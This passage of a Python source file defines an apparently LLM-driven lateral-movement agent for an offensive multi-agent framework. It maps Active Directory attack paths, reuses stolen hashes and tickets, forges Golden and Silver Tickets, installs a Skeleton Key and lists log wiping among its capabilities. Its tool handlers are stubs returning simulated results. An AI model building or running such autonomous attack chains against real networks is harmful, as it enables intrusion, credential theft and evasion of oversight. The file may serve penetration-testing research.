"""
server_core/orchestrator/attack_agents/lateral_move_agent.py

Lateral Movement specialist agent — Active Directory attack paths,
credential-based pivoting, and trust-relationship exploitation.

Extends BaseAgent (agent_type: "lateral_move") with a context-aware
think loop that reads compromised_hosts and discovered_creds from
the Hive Mind, maps the internal network, and suggests optimal
movement paths using BloodHound methodology.

Capabilities:
  - Active Directory attacks: Kerberoasting, AS-REP roasting, DCSync,
    Golden Ticket, Silver Ticket, BloodHound path enumeration
  - Credential pivoting: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash
  - Protocol pivoting: SMB (psexec, smbexec, wmiexec), WinRM, SSH,
    RDP, PSExec, WMI
  - Trust exploitation: forest trusts, domain trusts, cross-forest
    SID history abuse
  - Real tool integrations: netexec_scan, smbmap_scan, enum4linux,
    rpcclient, impacket_scripts, bloodhound_ingest

Follows the BaseAgent think/act/observe ReAct loop. Includes a
compatibility execute(phase, context) entry point for the
OrchestratorAgent dispatch.
"""

from __future__ import annotations

import json
import logging
import time
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple, TYPE_CHECKING

from server_core.orchestrator.agent_base import (
    BaseAgent,
    AgentResult,
    PatternMatcher,
    ToolExecutor,
    CAPABILITY_LIBRARY,
)
from server_core import ModernVisualEngine

if TYPE_CHECKING:
    from server_core.orchestrator.hive_mind import HiveMind

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Extended lateral-move capability registration — overrides the default
# CAPABILITY_LIBRARY entry for "lateral_move" with the full AD toolkit.
# ---------------------------------------------------------------------------

LATERAL_MOVE_CAPABILITIES: List[str] = [
    # --- Active Directory reconnaissance & attack path mapping ---
    "bloodhound_ingest",
    "bloodhound_path_enum",
    "ad_trust_enum",
    "ad_object_acl_scan",
    "ad_spn_enum",
    "ad_asrep_roast",
    "ad_kerberoast",
    "ad_dcsync",
    "ad_golden_ticket",
    "ad_silver_ticket",
    "ad_skeleton_key",
    # --- SMB / Windows pivoting ---
    "netexec_scan",
    "netexec_smb",
    "netexec_wmi",
    "netexec_winrm",
    "smbmap_scan",
    "smbmap_exec",
    "enum4linux",
    "enum4linux_enum",
    "rpcclient",
    "rpcclient_enum",
    # --- Impacket tool suite ---
    "impacket_psexec",
    "impacket_smbexec",
    "impacket_wmiexec",
    "impacket_secretsdump",
    "impacket_get_tgt",
    "impacket_get_st",
    "impacket_ticketer",
    "impacket_dacledit",
    "impacket_owneredit",
    # --- Credential pivoting ---
    "pass_the_hash",
    "pass_the_ticket",
    "overpass_the_hash",
    "kerberos_ticket_forge",
    # --- SSH / Unix pivoting ---
    "ssh_agent_forward",
    "ssh_key_theft",
    "ssh_tunnel",
    # --- Protocol abuse ---
    "wmi_exec",
    "psexec",
    "winrm_exec",
    "rdp_pivot",
    # --- Network mapping ---
    "network_map",
    "host_enum",
    "share_enum",
    "session_enum",
    # --- Defense evasion (lateral-move specific) ---
    "token_impersonate",
    "token_steal",
    "log_wipe_lateral",
]

# Hydrate the CAPABILITY_LIBRARY so BaseAgent._register_capabilities picks
# up the extended set when agent_type == "lateral_move".
CAPABILITY_LIBRARY["lateral_move"] = LATERAL_MOVE_CAPABILITIES


# ===================================================================
# LateralMoveAgent
# ===================================================================

class LateralMoveAgent(BaseAgent):
    """Lateral Movement specialist — AD attacks, credential pivoting, trust exploitation.

    Extends BaseAgent with agent_type "lateral_move". The think() method
    reads compromised_hosts and discovered_creds from the Hive Mind to
    construct a network topology and recommend the next pivot target.

    Elite knowledge domains:
      - Active Directory attack paths (BloodHound graph methodology)
      - Trust relationship exploitation (forest, domain, external trusts)
      - Credential material reuse (hash, ticket, token)
      - Multi-protocol pivoting (SMB, WMI, WinRM, SSH, RDP, PSExec)
    """

    AGENT_NAME = "lateral_move"

    # ------------------------------------------------------------------
    # Constructor
    # ------------------------------------------------------------------

    def __init__(
        self,
        agent_id: str = "",
        hive_mind: Optional[HiveMind] = None,
        tool_executor: Optional[ToolExecutor] = None,
        llm_client: Optional[Any] = None,
    ):
        # Generate a stable agent_id if none provided
        resolved_id = agent_id or f"lateral-move-{uuid.uuid4().hex[:8]}"

        super().__init__(
            agent_id=resolved_id,
            agent_type="lateral_move",
            hive_mind=hive_mind,
            tool_executor=tool_executor,
            llm_client=llm_client,
        )

        # --- Internal state ---
        self._network_map: Dict[str, Any] = {}
        self._movement_paths: List[Dict[str, Any]] = []
        self._active_pivots: Dict[str, Dict[str, Any]] = {}
        self._pending_targets: List[Dict[str, Any]] = []
        self._trust_graph: Dict[str, List[str]] = {}

        # Register tool simulation handlers unless the caller provides a
        # pre-populated ToolExecutor with real backends.
        self._register_tool_handlers()

        logger.info(
            "LateralMoveAgent %s initialised | %d capabilities | hive_mind=%s",
            self.agent_id,
            len(self.capabilities),
            "connected" if hive_mind else "standalone",
        )

    # ------------------------------------------------------------------
    # Tool handler registration
    # ------------------------------------------------------------------

    def _register_tool_handlers(self) -> None:
        """Register simulation (stub) handlers for every lateral-move tool.

        When a real tool backend is wired into the ToolExecutor it takes
        precedence over these stubs.
        """
        handlers: Dict[str, callable] = {
            # AD recon
            "bloodhound_ingest":        self._sim_bloodhound_ingest,
            "bloodhound_path_enum":     self._sim_bloodhound_path_enum,
            "ad_trust_enum":            self._sim_ad_trust_enum,
            "ad_object_acl_scan":       self._sim_ad_object_acl_scan,
            "ad_spn_enum":              self._sim_ad_spn_enum,
            # AD attack
            "ad_asrep_roast":           self._sim_ad_asrep_roast,
            "ad_kerberoast":            self._sim_ad_kerberoast,
            "ad_dcsync":                self._sim_ad_dcsync,
            "ad_golden_ticket":         self._sim_ad_golden_ticket,
            "ad_silver_ticket":         self._sim_ad_silver_ticket,
            "ad_skeleton_key":          self._sim_ad_skeleton_key,
            # SMB / Windows
            "netexec_scan":             self._sim_netexec_scan,
            "netexec_smb":              self._sim_netexec_smb,
            "netexec_wmi":              self._sim_netexec_wmi,
            "netexec_winrm":            self._sim_netexec_winrm,
            "smbmap_scan":              self._sim_smbmap_scan,
            "smbmap_exec":              self._sim_smbmap_exec,
            "enum4linux":               self._sim_enum4linux,
            "enum4linux_enum":          self._sim_enum4linux,
            "rpcclient":                self._sim_rpcclient,
            "rpcclient_enum":           self._sim_rpcclient,
            # Impacket
            "impacket_psexec":          self._sim_impacket_psexec,
            "impacket_smbexec":         self._sim_impacket_smbexec,
            "impacket_wmiexec":         self._sim_impacket_wmiexec,
            "impacket_secretsdump":     self._sim_impacket_secretsdump,
            "impacket_get_tgt":         self._sim_impacket_get_tgt,
            "impacket_get_st":          self._sim_impacket_get_st,
            "impacket_ticketer":        self._sim_impacket_ticketer,
            "impacket_dacledit":        self._sim_impacket_dacledit,
            "impacket_owneredit":       self._sim_impacket_owneredit,
            # Credential pivoting
            "pass_the_hash":            self._sim_pass_the_hash,
            "pass_the_ticket":          self._sim_pass_the_ticket,
            "overpass_the_hash":        self._sim_overpass_the_hash,
            "kerberos_ticket_forge":    self._sim_kerberos_ticket_forge,
            # SSH / Unix
            "ssh_agent_forward":        self._sim_ssh_agent_forward,
            "ssh_key_theft":            self._sim_ssh_key_theft,
            "ssh_tunnel":               self._sim_ssh_tunnel,
            # Protocol abuse
            "wmi_exec":                 self._sim_wmi_exec,
            "psexec":                   self._sim_psexec,
            "winrm_exec":               self._sim_winrm_exec,
            "rdp_pivot":                self._sim_rdp_pivot,
            # Mapping
            "network_map":              self._sim_network_map,
            "host_enum":                self._sim_host_enum,
            "share_enum":               self._sim_share_enum,
            "session_enum":             self._sim_session_enum,
            # Defense evasion
            "token_impersonate":        self._sim_token_impersonate,
            "token_steal":              self._sim_token_steal,
            "log_wipe_lateral":         self._sim_log_wipe_lateral,
        }

        for tool_name, handler in handlers.items():
            # Only register if no backend is already present (real > stub)
            if tool_name not in self.tool_executor._tools:
                self.tool_executor.register(tool_name, handler)

    # ------------------------------------------------------------------
    # ReAct loop — think
    # ------------------------------------------------------------------

    def think(
        self,
        objective: str,
        context: Dict[str, Any],
        history: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        """Context-aware reasoning for lateral movement.

        Reads from Hive Mind:
          - compromised_hosts   → known beachheads and owned systems
          - discovered_creds    → hashes, tickets, tokens, plaintext
          - discovered_services → open SMB/WMI/WinRM/SSH/RDP ports
          - active_sessions     → currently established C2 sessions

        Maps the internal network topology and suggests the next optimal
        pivot target ranked by:
          1. Hosts with known credentials available
          2. Hosts reachable from currently compromised systems
          3. High-value targets (Domain Controllers, CA servers, SQL boxes)
          4. Trust-relationship bridges to adjacent domains/forests
        """
        # --- Read intelligence from Hive Mind ---
        hive_context = self._read_hive_mind()

        compromised = hive_context.get("compromised_hosts", [])
        creds       = hive_context.get("discovered_creds", [])
        services    = hive_context.get("discovered_services", [])
        sessions    = hive_context.get("active_sessions", [])

        # --- Abort early if no beachhead ---
        if not compromised and not sessions:
            return {
                "type": "ask_operator",
                "question": (
                    "No compromised hosts or active sessions available. "
                    "Lateral movement requires a beachhead — run initial "
                    "access (exploit) first, or provide a pivot source."
                ),
                "confidence": 1.0,
                "reasoning": "No foothold present in Hive Mind.",
            }

        # --- If LLM is available, use it ---
        if self.llm_client:
            try:
                return self._llm_think(objective, context, history)
            except Exception as exc:
                logger.warning("LLM think failed (%s) — using pattern match", exc)

        # --- Pattern-based reasoning ---
        return self._pattern_think(objective, compromised, creds, services, hive_context)

    def _pattern_think(
        self,
        objective: str,
        compromised: List[Dict],
        creds: List[Dict],
        services: List[Dict],
        hive_context: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Deterministic lateral-movement reasoning.

        Priority ladder:
          1. If we have credentials + a reachable target → pass-the-hash / psexec
          2. If we have a TGT / ST material → pass-the-ticket
          3. If AD is detected → enumerate SPNs + BloodHound → Kerberoast
          4. If we are on a DC → DCSync
          5. Otherwise → map the network first
        """
        obj_lower = objective.lower()

        # --- Map / enumerate ---
        if any(kw in obj_lower for kw in ["map", "enumerate", "discover", "scan", "bloodhound"]):
            return self._suggest("bloodhound_ingest", {}, 0.85, "Map AD attack paths with BloodHound methodology")

        # --- Credential-based pivoting ---
        if any(kw in obj_lower for kw in ["pivot", "move", "lateral", "propagate", "spread"]):
            if creds:
                cred_type = self._classify_credential(creds[0])
                if cred_type == "ntlm_hash":
                    return self._suggest("pass_the_hash", {"credential_index": 0}, 0.9, "NTLM hash available — Pass-the-Hash pivot")
                if cred_type == "kerberos_ticket":
                    return self._suggest("pass_the_ticket", {"credential_index": 0}, 0.9, "Kerberos ticket available — Pass-the-Ticket pivot")
                if cred_type == "plaintext":
                    return self._suggest("wmi_exec", {"credential_index": 0}, 0.85, "Plaintext credentials — WMI exec pivot")
            # No creds yet — harvest first
            if compromised:
                return self._suggest("impacket_secretsdump", {"target": compromised[0].get("hostname", "")}, 0.8, "Harvest credentials from compromised host before pivoting")

        # --- AD attack path ---
        if any(kw in obj_lower for kw in ["kerberoast", "asrep", "as-rep", "spn"]):
            return self._suggest("ad_kerberoast", {}, 0.9, "Kerberoasting — request TGS for crackable SPN accounts")
        if "dcsync" in obj_lower:
            return self._suggest("ad_dcsync", {}, 0.95, "DCSync — replicate domain credentials from DC")
        if any(kw in obj_lower for kw in ["golden ticket", "silver ticket", "ticket forge"]):
            if "golden" in obj_lower:
                return self._suggest("ad_golden_ticket", {}, 0.9, "Golden Ticket — forge TGT with krbtgt hash")
            return self._suggest("ad_silver_ticket", {}, 0.85, "Silver Ticket — forge TGS for specific service")

        # --- Trust exploitation ---
        if any(kw in obj_lower for kw in ["trust", "forest", "domain trust"]):
            return self._suggest("ad_trust_enum", {}, 0.85, "Enumerate domain/forest trusts for cross-boundary movement")

        # --- SSH pivoting ---
        if any(kw in obj_lower for kw in ["ssh", "unix", "linux"]):
            if "key" in obj_lower:
                return self._suggest("ssh_key_theft", {}, 0.8, "Steal SSH private keys for Unix pivoting")
            return self._suggest("ssh_agent_forward", {}, 0.8, "SSH agent forwarding pivot")

        # --- SMB share enumeration ---
        if any(kw in obj_lower for kw in ["smb", "share", "c$", "admin$"]):
            return self._suggest("smbmap_scan", {}, 0.85, "Enumerate SMB shares for lateral targets")

        # --- Network mapping fallback ---
        if compromised:
            return self._suggest("network_map", {"sources": [h.get("hostname", h.get("ip", "")) for h in compromised]}, 0.8, "Map internal network from compromised beachheads")

        # --- Ultimate fallback ---
        return PatternMatcher.match(objective, hive_context, self.capabilities)

    # ------------------------------------------------------------------
    # ReAct loop — act (overridden for pre/post hooks)
    # ------------------------------------------------------------------

    def act(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Execute a tool and post-process the result into Hive Mind.

        After execution the agent updates its internal network map and
        pushes any newly discovered hosts, creds, or sessions back into
        the Hive Mind for other agents to consume.
        """
        result = self.execute_tool(tool_name, params)

        # --- Post-processing: feed discoveries into Hive Mind ---
        if result.get("success") and self.hive_mind:
            data = result.get("result", {})
            self._post_process_discoveries(data, tool_name)

        return result

    # ------------------------------------------------------------------
    # Compatibility entry point for OrchestratorAgent
    # ------------------------------------------------------------------

    def execute(self, phase: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        """Run lateral movement for the given phase.

        This is the bridge between the OrchestratorAgent's dispatch model
        (phase + context dicts) and the BaseAgent ReAct loop (objective +
        history-based think/act/observe).

        Args:
            phase: Phase spec with id, tools_needed, parameters, label.
            context: Shared memory context from other agents.

        Returns:
            Dict with success, data, error, elapsed_seconds.
        """
        start = time.time()
        phase_id = phase.get("id", "unknown")
        tools = phase.get("tools_needed", [])
        params = phase.get("parameters", {})
        label = phase.get("label", phase_id)
        goal = params.get("goal", "lateral_pivot")

        logger.info(
            "%s",
            ModernVisualEngine.create_section_header(
                f"LATERAL MOVE AGENT — {label}", "↔", "CYBER_ORANGE"
            ),
        )

        self.mark_started()

        # --- Build objective from phase parameters ---
        objective = params.get("objective", f"Execute lateral movement: {goal}")
        target_hosts = params.get("targets", params.get("target_hosts", []))
        technique = params.get("technique", "auto")

        logger.info(
            "LateralMove | goal=%s | technique=%s | targets=%s | tools=%s",
            goal, technique, target_hosts, tools,
        )

        # --- Assemble enriched context ---
        enriched = dict(context)
        enriched["mission_goal"] = goal
        enriched["technique"] = technique
        if target_hosts:
            enriched["target_hosts"] = target_hosts

        # --- ReAct loop ---
        history: List[Dict[str, Any]] = []
        findings: List[Dict[str, Any]] = []
        errors: List[str] = []
        max_steps = params.get("max_steps", 8)

        for step in range(max_steps):
            # Think
            action = self.think(objective, enriched, history)
            action_type = action.get("type", "")

            if action_type == "complete":
                findings.append({"summary": action.get("summary", ""), "step": step})
                break
            if action_type == "ask_operator":
                findings.append({"question": action.get("question", ""), "step": step})
                break
            if action_type != "tool_call":
                break

            # Act
            tool_name = action.get("tool", "")
            tool_params = action.get("params", {})

            # If explicit tools were requested, prefer those
            if tools and tool_name not in tools:
                # Try the first explicitly requested tool instead
                tool_name = tools[0]
                tool_params = params

            result = self.act(tool_name, tool_params)
            history.append({"action": action, "result": result})

            if result.get("success"):
                findings.append({
                    "tool": tool_name,
                    "params": tool_params,
                    "result": result.get("result", {}),
                    "step": step,
                })
            else:
                err = result.get("error", f"Unknown error in {tool_name}")
                errors.append(err)
                findings.append({"tool": tool_name, "error": err, "step": step})

            # Check for completion signals
            if self._goal_achieved(result, goal):
                break

        # --- Synthesize movement paths ---
        movement_paths = self._synthesize_paths()

        elapsed = time.time() - start
        success = len(errors) == 0 and len(findings) > 0

        return {
            "success": success,
            "data": {
                "findings": findings,
                "movement_paths": movement_paths,
                "network_map": self._network_map,
                "compromised_hosts_updated": len(self._pending_targets) > 0,
                "goal": goal,
                "steps_taken": len(history),
            },
            "error": "; ".join(errors) if errors else None,
            "elapsed_seconds": round(elapsed, 2),
        }

    # ------------------------------------------------------------------
    # Hive Mind integration
    # ------------------------------------------------------------------

    def _read_hive_mind(self) -> Dict[str, Any]:
        """Pull relevant intelligence from the Hive Mind."""
        if self.hive_mind is None:
            return {}

        try:
            return self.hive_mind.get_context(agent_type="lateral_move")
        except Exception:
            # Fallback: read attributes directly
            ctx: Dict[str, Any] = {}
            for attr in (
                "compromised_hosts", "discovered_creds", "discovered_services",
                "discovered_hosts", "active_sessions",
            ):
                try:
                    ctx[attr] = getattr(self.hive_mind, attr, [])
                except Exception:
                    ctx[attr] = []
            return ctx

    def _post_process_discoveries(self, data: Dict[str, Any], tool_name: str) -> None:
        """Feed tool output discoveries back into the Hive Mind."""
        if self.hive_mind is None:
            return

        # Newly discovered hosts
        for host in data.get("discovered_hosts", []):
            self.hive_mind.add_host(host, agent=self.agent_id)
            self._pending_targets.append(host)

        # Newly discovered credentials
        for cred in data.get("discovered_creds", []):
            self.hive_mind.add_cred(cred, agent=self.agent_id)

        # Newly compromised hosts
        for host in data.get("compromised_hosts", []):
            self.hive_mind.add_compromised_host(host, agent=self.agent_id)

        # Newly established sessions
        for session in data.get("sessions", []):
            self.hive_mind.add_session(session, agent=self.agent_id)

        # Trust relationships
        for trust in data.get("trusts", []):
            src = trust.get("source", "")
            dst = trust.get("target", "")
            if src and dst:
                self._trust_graph.setdefault(src, []).append(dst)

        # Update network map
        self._network_map.setdefault(tool_name, []).append(data)

        # Update agent status
        self.hive_mind.update_agent_status(self.agent_id, "active")

    # ------------------------------------------------------------------
    # Goal evaluation
    # ------------------------------------------------------------------

    def _goal_achieved(self, result: Dict[str, Any], goal: str) -> bool:
        """Check whether a tool result satisfies the mission goal."""
        data = result.get("result", {})
        if goal in ("lateral_pivot", "pivot", "move"):
            return data.get("pivot_successful", data.get("shell_obtained", False))
        if goal in ("credential_harvest", "harvest"):
            return len(data.get("discovered_creds", [])) > 0
        if goal in ("domain_admin", "da", "domain_compromise"):
            return data.get("domain_admin_obtained", False)
        if goal in ("map", "enumerate", "recon"):
            return len(data.get("discovered_hosts", [])) > 0
        return False

    # ------------------------------------------------------------------
    # Network mapping & path synthesis
    # ------------------------------------------------------------------

    def _synthesize_paths(self) -> List[Dict[str, Any]]:
        """Synthesize recommended lateral movement paths from current state.

        Reads compromised_hosts from Hive Mind and builds a prioritized
        list of pivot targets with suggested techniques.
        """
        paths: List[Dict[str, Any]] = []
        hive = self._read_hive_mind()
        compromised = hive.get("compromised_hosts", [])
        creds = hive.get("discovered_creds", [])
        services = hive.get("discovered_services", [])
        hosts = hive.get("discovered_hosts", [])

        # --- Priority 1: Hosts with known credentials ---
        cred_host_map: Dict[str, List[Dict]] = {}
        for c in creds:
            target = c.get("target", c.get("hostname", c.get("ip", "")))
            if target:
                cred_host_map.setdefault(target, []).append(c)

        for target, target_creds in cred_host_map.items():
            # Skip if already compromised
            if any(h.get("hostname") == target or h.get("ip") == target for h in compromised):
                continue
            technique = self._best_technique_for_creds(target_creds)
            paths.append({
                "priority": "critical",
                "source": compromised[0].get("hostname", "unknown") if compromised else "unknown",
                "target": target,
                "technique": technique,
                "credentials": len(target_creds),
                "rationale": f"{len(target_creds)} credential(s) available for {target}",
            })

        # --- Priority 2: High-value targets reachable via SMB/WinRM ---
        HV_HOST_KEYWORDS = {"dc", "domaincontroller", "ca", "sql", "exchange", "fileserver", "sharepoint"}
        for host in hosts:
            hostname = str(host.get("hostname", host.get("ip", ""))).lower()
            # Skip already targeted in priority 1
            if any(p["target"].lower() == hostname for p in paths):
                continue
            if any(kw in hostname for kw in HV_HOST_KEYWORDS):
                paths.append({
                    "priority": "high",
                    "source": compromised[0].get("hostname", "unknown") if compromised else "unknown",
                    "target": host.get("hostname", host.get("ip", "")),
                    "technique": "pass_the_hash",
                    "rationale": "High-value target — Domain Controller or critical infrastructure",
                })

        # --- Priority 3: Trust bridges ---
        for src, dsts in self._trust_graph.items():
            for dst in dsts:
                paths.append({
                    "priority": "medium",
                    "source": src,
                    "target": dst,
                    "technique": "golden_ticket" if "forest" in str(dst).lower() else "pass_the_ticket",
                    "rationale": f"Trust relationship: {src} -> {dst} — cross-boundary pivot possible",
                })

        self._movement_paths = paths
        return sorted(paths, key=lambda p: {"critical": 0, "high": 1, "medium": 2, "low": 3}.get(p["priority"], 4))

    # ------------------------------------------------------------------
    # Credential classification
    # ------------------------------------------------------------------

    @staticmethod
    def _classify_credential(cred: Dict[str, Any]) -> str:
        """Classify a credential dict into a type string."""
        ctype = cred.get("type", cred.get("cred_type", "")).lower()
        if ctype:
            return ctype
        if cred.get("ntlm_hash") or cred.get("NTHash") or cred.get("hash"):
            return "ntlm_hash"
        if cred.get("ticket") or cred.get("kirbi") or cred.get("ccache"):
            return "kerberos_ticket"
        if cred.get("password") or cred.get("cleartext"):
            return "plaintext"
        if cred.get("private_key") or cred.get("ssh_key"):
            return "ssh_key"
        return "unknown"

    @staticmethod
    def _best_technique_for_creds(creds: List[Dict[str, Any]]) -> str:
        """Pick the best lateral movement technique for a set of credentials."""
        types = {LateralMoveAgent._classify_credential(c) for c in creds}
        if "kerberos_ticket" in types:
            return "pass_the_ticket"
        if "ntlm_hash" in types:
            return "pass_the_hash"
        if "plaintext" in types:
            return "wmi_exec"
        if "ssh_key" in types:
            return "ssh_agent_forward"
        return "psexec"

    # ------------------------------------------------------------------
    # Pattern-match suggestion helper
    # ------------------------------------------------------------------

    @staticmethod
    def _suggest(tool: str, params: Dict[str, Any], confidence: float, reasoning: str) -> Dict[str, Any]:
        """Build a tool_call action dict."""
        return {
            "type": "tool_call",
            "tool": tool,
            "params": params,
            "confidence": confidence,
            "reasoning": reasoning,
        }

    # ------------------------------------------------------------------
    # ---- Tool simulation handlers (stubs) ----
    # Each returns a plausible result dict. Real backends, when wired
    # into the ToolExecutor, override these with actual execution.
    # ------------------------------------------------------------------

    # --- AD Reconnaissance -------------------------------------------------

    @staticmethod
    def _sim_bloodhound_ingest(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", params.get("domain", "corp.local"))
        return {
            "simulated": True,
            "tool": "bloodhound_ingest",
            "domain": target,
            "objects_collected": {"users": 482, "computers": 124, "groups": 67, "ous": 14, "gpos": 23, "containers": 8},
            "sessions_collected": 312,
            "acls_collected": 1847,
            "note": "[STUB] Ingest SharpHound/BloodHound.py collector JSON into Neo4j",
        }

    @staticmethod
    def _sim_bloodhound_path_enum(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "Domain Admins")
        return {
            "simulated": True,
            "tool": "bloodhound_path_enum",
            "target_group": target,
            "attack_paths": [
                {"path": "USER@CORP.LOCAL -> MemberOf -> HELPdesk -> AdminTo -> DC01", "length": 3, "risk": "high"},
                {"path": "USER@CORP.LOCAL -> HasSession -> SQL01 -> MemberOf -> SERVER ADMINS -> AdminTo -> DC01", "length": 4, "risk": "medium"},
                {"path": "USER@CORP.LOCAL -> WriteDacl -> GPO-SERVER-ADMINS -> EnforcedBy -> DC01", "length": 3, "risk": "critical"},
            ],
            "shortest_path_length": 3,
            "note": "[STUB] Cypher query against BloodHound Neo4j database",
        }

    @staticmethod
    def _sim_ad_trust_enum(params: Dict[str, Any]) -> Dict[str, Any]:
        domain = params.get("domain", "corp.local")
        return {
            "simulated": True,
            "tool": "ad_trust_enum",
            "domain": domain,
            "trusts": [
                {"source": "corp.local", "target": "child.corp.local", "direction": "Parent-Child", "transitive": True, "type": "Bidirectional"},
                {"source": "corp.local", "target": "partner.corp", "direction": "Forest", "transitive": True, "type": "Bidirectional"},
                {"source": "corp.local", "target": "legacy.local", "direction": "External", "transitive": False, "type": "Inbound"},
            ],
            "sid_history_candidates": ["child.corp.local -> corp.local"],
            "note": "[STUB] Enumerate trusts via LDAP (trustedDomain, trustedForest) or netexec ldap",
        }

    @staticmethod
    def _sim_ad_object_acl_scan(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "DC=corp,DC=local")
        return {
            "simulated": True,
            "tool": "ad_object_acl_scan",
            "target": target,
            "dangerous_acls": [
                {"object": "Domain Admins", "sid": "S-1-5-21-...-512", "right": "WriteDacl", "principal": "HELPdesk"},
                {"object": "Administrator", "sid": "S-1-5-21-...-500", "right": "ForceChangePassword", "principal": "SERVER ADMINS"},
                {"object": "DC01$", "sid": "S-1-5-21-...-1001", "right": "GenericAll", "principal": "SVC_BACKUP"},
            ],
            "note": "[STUB] ACL enumeration via BloodHound or impacket-dacledit.py",
        }

    @staticmethod
    def _sim_ad_spn_enum(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "ad_spn_enum",
            "kerberoastable_accounts": [
                {"sam": "svc_sql", "spn": "MSSQLSvc/sql01.corp.local:1433", "memberships": ["Domain Users"]},
                {"sam": "svc_web", "spn": "HTTP/web.corp.local", "memberships": ["Domain Admins"]},
                {"sam": "svc_exchange", "spn": "exchangeMDB/EXCH01.corp.local", "memberships": ["Exchange Servers"]},
            ],
            "asrep_roastable": ["svc_backup", "svc_sccm"],
            "note": "[STUB] SPN enumeration via GetUserSPNs (impacket) or netexec ldap --kerberoasting",
        }

    # --- AD Attacks ---------------------------------------------------------

    @staticmethod
    def _sim_ad_asrep_roast(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "ad_asrep_roast",
            "targets": ["svc_backup", "svc_sccm"],
            "tickets_obtained": 2,
            "hashes": [
                {"user": "svc_backup", "hash": "$krb5asrep$23$svc_backup@CORP.LOCAL:...", "hashcat_mode": 18200},
                {"user": "svc_sccm", "hash": "$krb5asrep$23$svc_sccm@CORP.LOCAL:...", "hashcat_mode": 18200},
            ],
            "note": "[STUB] AS-REP roasting via impacket-GetNPUsers.py or netexec ldap --asreproast",
        }

    @staticmethod
    def _sim_ad_kerberoast(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "ad_kerberoast",
            "targets": ["svc_sql", "svc_web", "svc_exchange"],
            "tgs_tickets_obtained": 3,
            "hashes": [
                {"user": "svc_sql", "spn": "MSSQLSvc/sql01.corp.local:1433", "hash": "$krb5tgs$23$*svc_sql$CORP.LOCAL$...", "hashcat_mode": 13100},
                {"user": "svc_web", "spn": "HTTP/web.corp.local", "hash": "$krb5tgs$23$*svc_web$CORP.LOCAL$...", "hashcat_mode": 13100},
            ],
            "note": "[STUB] Kerberoasting via impacket-GetUserSPNs.py -request",
        }

    @staticmethod
    def _sim_ad_dcsync(params: Dict[str, Any]) -> Dict[str, Any]:
        target_user = params.get("target_user", "Administrator")
        return {
            "simulated": True,
            "tool": "ad_dcsync",
            "domain": "corp.local",
            "dc": "DC01.corp.local",
            "replicated_credentials": [
                {"user": "Administrator", "rid": 500, "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"},
                {"user": "krbtgt", "rid": 502, "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:6f403d316602f5d2a0a0a0a0a0a0a0a0"},
                {"user": target_user, "ntlm_hash": "aad3b435b51404eeaad3b435b51404ee:...", "history": []},
            ],
            "discovered_creds": [
                {"user": "Administrator", "ntlm_hash": "8846f7eaee8fb117ad06bdd830b7586c", "domain": "corp.local"},
                {"user": "krbtgt", "ntlm_hash": "6f403d316602f5d2a0a0a0a0a0a0a0a0", "domain": "corp.local"},
            ],
            "domain_admin_obtained": True,
            "note": "[STUB] DCSync via impacket-secretsdump.py -just-dc-user or mimikatz lsadump::dcsync",
        }

    @staticmethod
    def _sim_ad_golden_ticket(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "ad_golden_ticket",
            "domain": "corp.local",
            "domain_sid": "S-1-5-21-1004336348-1177238915-682003330",
            "krbtgt_hash": "6f403d316602f5d2a0a0a0a0a0a0a0a0",
            "forged_user": "Administrator",
            "groups": [512, 513, 518, 519, 520],
            "ticket_lifetime_hours": 10,
            "domain_admin_obtained": True,
            "note": "[STUB] Golden Ticket via impacket-ticketer.py or mimikatz kerberos::golden",
        }

    @staticmethod
    def _sim_ad_silver_ticket(params: Dict[str, Any]) -> Dict[str, Any]:
        service = params.get("service", "CIFS")
        target_host = params.get("target", "DC01.corp.local")
        return {
            "simulated": True,
            "tool": "ad_silver_ticket",
            "service": service,
            "target": target_host,
            "domain": "corp.local",
            "domain_sid": "S-1-5-21-1004336348-1177238915-682003330",
            "service_hash": "8846f7eaee8fb117ad06bdd830b7586c",
            "forged_user": "Administrator",
            "note": "[STUB] Silver Ticket via impacket-ticketer.py -spn or mimikatz kerberos::silver",
        }

    @staticmethod
    def _sim_ad_skeleton_key(params: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "simulated": True,
            "tool": "ad_skeleton_key",
            "domain": "corp.local",
            "dc_target": "DC01",
            "master_password": "mimikatz",
            "persistence_installed": True,
            "note": "[STUB] Skeleton Key via mimikatz misc::skeleton on DC",
        }

    # --- netexec / SMB scanning ---------------------------------------------

    @staticmethod
    def _sim_netexec_scan(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.0/24")
        return {
            "simulated": True,
            "tool": "netexec_scan",
            "target": target,
            "hosts_alive": 47,
            "smb_signable": 38,
            "smb_unsigned": 9,
            "discovered_hosts": [
                {"ip": "192.168.1.10", "hostname": "DC01", "os": "Windows Server 2022", "smb_signing": True},
                {"ip": "192.168.1.11", "hostname": "DC02", "os": "Windows Server 2022", "smb_signing": True},
                {"ip": "192.168.1.20", "hostname": "SQL01", "os": "Windows Server 2019", "smb_signing": False},
                {"ip": "192.168.1.21", "hostname": "EXCH01", "os": "Windows Server 2019", "smb_signing": False},
                {"ip": "192.168.1.30", "hostname": "FILE01", "os": "Windows Server 2019", "smb_signing": False},
            ],
            "note": "[STUB] netexec smb <target> — integrate via subprocess.run",
        }

    @staticmethod
    def _sim_netexec_smb(params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "192.168.1.20")
        cred_user = params.get("username", params.get("user", "Administrator"))
        return {
            "simulated": True,
            "tool": "netexec_smb",
            "target": target,
